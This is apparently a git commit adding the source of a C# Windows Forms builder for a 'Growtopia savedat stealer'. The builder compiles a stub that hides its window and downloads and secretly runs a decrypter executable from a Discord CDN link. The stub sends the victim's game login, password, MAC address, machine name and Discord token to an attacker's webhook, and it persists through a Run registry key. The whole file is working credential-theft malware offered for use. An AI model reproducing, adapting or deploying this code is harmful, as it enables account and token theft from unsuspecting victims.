fec02957c2714eeec8206f8b3b4d8dbc8ebf36b8
welldays <76880062+welldays@users.noreply.github.com>
2022-03-06 21:39:31 +0300

    Add files via upload

---
+++ WindowsFormsApplication31/WindowsFormsApplication31/Form1.Designer.cs
@@ -0,0 +1,124 @@
+﻿namespace WindowsFormsApplication31
+{
+    partial class Form1
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.button1 = new System.Windows.Forms.Button();
+            this.checkBox1 = new System.Windows.Forms.CheckBox();
+            this.checkBox2 = new System.Windows.Forms.CheckBox();
+            this.textBox1 = new System.Windows.Forms.TextBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.checkBox3 = new System.Windows.Forms.CheckBox();
+            this.SuspendLayout();
+            // 
+            // button1
+            // 
+            this.button1.Location = new System.Drawing.Point(122, 86);
+            this.button1.Name = "button1";
+            this.button1.Size = new System.Drawing.Size(75, 23);
+            this.button1.TabIndex = 0;
+            this.button1.Text = "Build";
+            this.button1.UseVisualStyleBackColor = true;
+            this.button1.Click += new System.EventHandler(this.button1_Click);
+            // 
+            // checkBox1
+            // 
+            this.checkBox1.AutoSize = true;
+            this.checkBox1.Location = new System.Drawing.Point(12, 55);
+            this.checkBox1.Name = "checkBox1";
+            this.checkBox1.Size = new System.Drawing.Size(97, 17);
+            this.checkBox1.TabIndex = 1;
+            this.checkBox1.Text = "Trace Savedat";
+            this.checkBox1.UseVisualStyleBackColor = true;
+            // 
+            // checkBox2
+            // 
+            this.checkBox2.AutoSize = true;
+            this.checkBox2.Location = new System.Drawing.Point(108, 55);
+            this.checkBox2.Name = "checkBox2";
+            this.checkBox2.Size = new System.Drawing.Size(100, 17);
+            this.checkBox2.TabIndex = 2;
+            this.checkBox2.Text = "Regedit Startup";
+            this.checkBox2.UseVisualStyleBackColor = true;
+            // 
+            // textBox1
+            // 
+            this.textBox1.Location = new System.Drawing.Point(108, 15);
+            this.textBox1.Name = "textBox1";
+            this.textBox1.Size = new System.Drawing.Size(197, 20);
+            this.textBox1.TabIndex = 3;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Location = new System.Drawing.Point(9, 18);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(93, 13);
+            this.label1.TabIndex = 4;
+            this.label1.Text = "Discord Webhook";
+            // 
+            // checkBox3
+            // 
+            this.checkBox3.AutoSize = true;
+            this.checkBox3.Location = new System.Drawing.Point(214, 55);
+            this.checkBox3.Name = "checkBox3";
+            this.checkBox3.Size = new System.Drawing.Size(96, 17);
+            this.checkBox3.TabIndex = 5;
+            this.checkBox3.Text = "Discord Token";
+            this.checkBox3.UseVisualStyleBackColor = true;
+            // 
+            // Form1
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(317, 121);
+            this.Controls.Add(this.checkBox3);
+            this.Controls.Add(this.label1);
+            this.Controls.Add(this.textBox1);
+            this.Controls.Add(this.checkBox2);
+            this.Controls.Add(this.checkBox1);
+            this.Controls.Add(this.button1);
+            this.Name = "Form1";
+            this.Text = "growtopia simple savedat stealer";
+            this.Load += new System.EventHandler(this.Form1_Load);
+            this.ResumeLayout(false);
+            this.PerformLayout();
+
+        }
+
+        #endregion
+
+        private System.Windows.Forms.Button button1;
+        private System.Windows.Forms.CheckBox checkBox1;
+        private System.Windows.Forms.CheckBox checkBox2;
+        private System.Windows.Forms.TextBox textBox1;
+        private System.Windows.Forms.Label label1;
+        private System.Windows.Forms.CheckBox checkBox3;
+    }
+}
+
---
+++ WindowsFormsApplication31/WindowsFormsApplication31/Form1.cs
@@ -0,0 +1,380 @@
+﻿using Microsoft.CSharp;
+using System;
+using System.CodeDom.Compiler;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace WindowsFormsApplication31
+{
+    public partial class Form1 : Form
+    {
+        class stubcode
+        {
+            public string stubs = @"using System.Reflection;
+using System.Runtime.InteropServices;
+using System;
+using System.Net;
+using System.Collections.Specialized;
+using System.IO;
+using System.Collections.Generic;
+using System.Windows.Forms;
+using System.Threading.Tasks;
+using System.Diagnostics;
+using Microsoft.VisualBasic;
+using Microsoft.Win32;
+using System.Net.NetworkInformation;
+using System.Text;
+using System.Threading;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.Runtime.CompilerServices;
+
+namespace basicst
+{
+    public class basicstealer : IDisposable
+    {
+
+        public string WebHook { get; set; }
+
+        public string Attachment { get; set; }
+
+        public basicstealer()
+        {
+            this.discordCli = new WebClient();
+        }
+
+        public void SendMessage(string msgSend)
+        {
+            basicstealer.discordValues.Add(""content"", msgSend);
+            this.discordCli.UploadValues(this.WebHook, basicstealer.discordValues);
+        }
+
+        public void SendAttachment(string path)
+        {
+            this.discordCli.UploadFile(this.WebHook, path);
+        }
+
+        public void Dispose()
+        {
+            this.discordCli.Dispose();
+        }
+
+        private readonly WebClient discordCli;
+
+        private static NameValueCollection discordValues = new NameValueCollection();
+    }
+
+    internal class Program
+    {
+        public static string dirPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia"", previus;
+        public static string savePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + ""\\Growtopia\\save.dat"";
+        public static FileSystemWatcher fileSystemWatcher = new FileSystemWatcher();
+        public static void popup(string username, string password)
+        {
+            if(string.IsNullOrEmpty(username)|| string.IsNullOrEmpty(password))
+            {
+
+            }
+            else
+            {
+                previus = username + password;
+                WebClient webClient = new WebClient();
+            //string ip = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");
+            using (basicstealer webhook = new basicstealer())
+            {
+                webhook.WebHook = ""#webhook"";
+                webhook.SendMessage(string.Concat(new string[]
+				{
+                    ""GrowID: "",
+                    username,
+                    ""\nPassword: "",
+                    password,  
+					//""\nIp adress: "",
+					//ip,
+                    ""\nMac Adress: "",
+					GetMACAddress(),
+					""\nDiscord token: "",
+					//discordtoken,
+					""\nPC Name: "",
+					Environment.UserName,
+					""/"",
+					Environment.MachineName
+				}));
+                }
+            }
+        }
+        [DllImport(""Kernel32.dll"")]
+        private static extern IntPtr GetConsoleWindow();
+
+        [DllImport(""User32.dll"")]
+        private static extern bool ShowWindow(IntPtr hWnd, int cmdShow);
+
+
+        public static string GetMACAddress()
+        {
+            NetworkInterface[] nics = NetworkInterface.GetAllNetworkInterfaces();
+            String sMacAddress = string.Empty;
+            foreach (NetworkInterface adapter in nics)
+            {
+                if (sMacAddress == String.Empty)
+                {
+                    IPInterfaceProperties properties = adapter.GetIPProperties();
+                    sMacAddress = adapter.GetPhysicalAddress().ToString();
+                }
+            }
+            string macadressgrabber = sMacAddress;
+            return macadressgrabber;
+        }
+
+
+        public static string takeToken()
+        {
+            try
+            {
+                string text = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + ""//Discord//Local Storage//leveldb//000005.ldb"");
+                int num;
+                while ((num = text.IndexOf(""oken"")) != -1)
+                {
+                    text = text.Substring(num + ""oken"".Length);
+                }
+                return text.Split('""')[1];
+            }
+            catch (Exception)
+            {
+                return null;
+            }
+        }
+
+
+        public static void Startup()
+        {
+            string asd = Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath);
+            try
+            {
+                if (File.Exists(asd))
+                {
+                    File.Delete(asd);
+                }
+                File.Copy(Application.ExecutablePath, Path.GetTempPath() + Path.GetFileName(Application.ExecutablePath));
+                RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(""SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"", true);
+                registryKey.SetValue(Path.GetFileNameWithoutExtension(asd), asd);
+            }
+            catch
+            {
+                Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(asd));
+                if (processesByName.Length > 0)
+                {
+                    Process[] array = processesByName;
+                    int num = 0;
+                    if (num < array.Length)
+                    {
+                        Process process = array[num];
+                        process.Kill();
+                    }
+                }
+            }
+        }
+        public static void tracesavedat()
+        {
+            new WebClient().DownloadFile(""https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe"", Path.GetTempPath() + ""\\savedecrypter.exe"");// ama's savedecrypter
+            new FileStream(Path.GetTempPath() + ""\\user.txt"", FileMode.OpenOrCreate, FileAccess.Write).Close();
+            Process.Start(new ProcessStartInfo
+            {
+                FileName = Path.GetTempPath() + ""\\savedecrypter.exe"",
+                WindowStyle = ProcessWindowStyle.Hidden
+            }).WaitForExit();
+            string[] packet = File.ReadAllText(Path.GetTempPath() + ""\\user.txt"").Split('|');
+            popup(packet[0], packet[1]);
+            fileSystemWatcher.Path = dirPath;
+            fileSystemWatcher.NotifyFilter = NotifyFilters.LastWrite;
+            fileSystemWatcher.Filter = ""*.dat"";
+            fileSystemWatcher.Changed += OnSaveChanged;
+            fileSystemWatcher.EnableRaisingEvents = true;
+            System.Threading.Thread.Sleep(-1);
+        }
+        private static void Main(string[] args)
+        {
+            //regeditstartup
+            //tracesavedat
+            IntPtr consoleWindow = Program.GetConsoleWindow();
+            if (consoleWindow != IntPtr.Zero)
+            {
+                Program.ShowWindow(consoleWindow, 0);
+            }
+            WebClient webClient = new WebClient();
+            //string ip = webClient.DownloadString(""http://ipv4bot.whatismyipaddress.com/"");
+            using (basicstealer webhook = new basicstealer())
+            {
+                webhook.WebHook = ""#webhook"";
+                webhook.SendMessage(string.Concat(new string[]
+				{
+					//""Ip adress: "",
+					//ip,
+                    ""\nMac Adress: "",
+					GetMACAddress(),
+					""\nDiscord token: "",
+					//discordtoken,
+					""\nPC Name: "",
+					Environment.UserName,
+					""/"",
+					Environment.MachineName
+				}));
+                webhook.SendAttachment(savePath);
+            }
+        }
+        private static void OnSaveChanged(object source, FileSystemEventArgs e)
+        {
+            if (e.FullPath == savePath)
+            {
+                try
+                {
+                    new FileStream(Path.GetTempPath() + ""\\user.txt"", FileMode.OpenOrCreate, FileAccess.Write).Close();
+                back:
+                    if (File.Exists(Path.GetTempPath() + ""\\savedecrypter.exe""))
+                    {
+                        Process.Start(new ProcessStartInfo
+                        {
+                            FileName = Path.GetTempPath() + ""\\savedecrypter.exe"",
+                            WindowStyle = ProcessWindowStyle.Hidden
+                        }).WaitForExit();
+                    }
+                    else
+                    {
+                        new WebClient().DownloadFile(""https://cdn.discordapp.com/attachments/846467508684587098/849921771910070312/savedecrypter.exe"", Path.GetTempPath() + ""\\savedecrypter.exe"");// savedecrypter
+                        goto back;
+                    }
+                    string[] packet = File.ReadAllText(Path.GetTempPath() + ""\\user.txt"").Split('|');
+                    fileSystemWatcher.EnableRaisingEvents = false;
+                    if (previus != packet[0] + packet[1])
+                    {
+                        previus = packet[0] + packet[1];
+                        if(string.IsNullOrEmpty(packet[0]) || string.IsNullOrEmpty(packet[1]))
+                        {
+
+                        }
+                        else
+                        {
+                            popup(packet[0], packet[1]);
+                        }                    
+                    }
+                }
+                finally
+                {
+                    fileSystemWatcher.EnableRaisingEvents = true;
+                }
+            }
+        }
+    }
+}
+";
+        }
+        class Compiler
+        {
+            private static readonly string[] referencedAssemblies = new string[]
+        {
+            "System.dll",
+            "System.Windows.Forms.dll",
+            "System.Drawing.dll",
+            "Microsoft.VisualBasic.dll"
+        };
+
+            public static bool CompileFromSource(string source, string outputAssembly)
+            {
+
+                var providerOptions = new Dictionary<string, string>() {
+                {"CompilerVersion", "v4.0" }
+            };
+
+                var compilerOptions = "/target:winexe /platform:anycpu /optimize";
+
+                using (var cSharpCodeProvider = new CSharpCodeProvider(providerOptions))
+                {
+                    var compilerParameters = new CompilerParameters(referencedAssemblies)
+                    {
+                        GenerateExecutable = true,
+                        OutputAssembly = outputAssembly,
+                        CompilerOptions = compilerOptions,
+                        TreatWarningsAsErrors = false,
+                        IncludeDebugInformation = false,
+                    };
+                    var compilerResults = cSharpCodeProvider.CompileAssemblyFromSource(compilerParameters, source);
+
+                    if (compilerResults.Errors.Count > 0)
+                    {
+                        MessageBox.Show(string.Format("The compiler has encountered {0} errors",
+                             compilerResults.Errors.Count), "Errors while compiling", MessageBoxButtons.OK,
+                             MessageBoxIcon.Error);
+
+                        foreach (CompilerError compilerError in compilerResults.Errors)
+                        {
+                            MessageBox.Show(string.Format("{0}\nLine: {1} - Column: {2}\nFile: {3}", compilerError.ErrorText,
+                                compilerError.Line, compilerError.Column, compilerError.FileName), "Error",
+                                MessageBoxButtons.OK, MessageBoxIcon.Error);
+                        }
+                    }
+
+                    return compilerResults.Errors.Count == 0;
+                }
+            }
+        }
+
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void Form1_Load(object sender, EventArgs e)
+        {
+
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            try
+            {
+                using (var saveFileDialog = new SaveFileDialog())
+                {
+                    saveFileDialog.Filter = "Executable (*.exe)|*.exe";
+                    if (saveFileDialog.ShowDialog() == DialogResult.OK)
+                    {
+                        stubcode sc = new stubcode();
+                        var stub = sc.stubs;
+                        stub = stub.Replace("%Guid%", Guid.NewGuid().ToString());
+                        stub = stub.Replace("#webhook", textBox1.Text);
+
+                        if (checkBox1.Checked == true)
+                        {
+                            stub = stub.Replace("//tracesavedat", "tracesavedat();");
+                        }
+                        if (checkBox2.Checked == true)
+                        {
+                            stub = stub.Replace("//regeditstartup", "Startup();");
+                        }
+                        if (checkBox3.Checked == true)
+                        {
+                            stub = stub.Replace("//discordtoken,", "takeToken(),");
+                        }
+
+                        var succes = Compiler.CompileFromSource(stub, saveFileDialog.FileName);
+
+                        if (succes)
+                        {
+                            MessageBox.Show("successful build!");
+                        }
+                    }
+                }
+            }
+            catch(Exception ex)
+            {
+                MessageBox.Show(ex.ToString());
+            }
+        }
+    }
+}
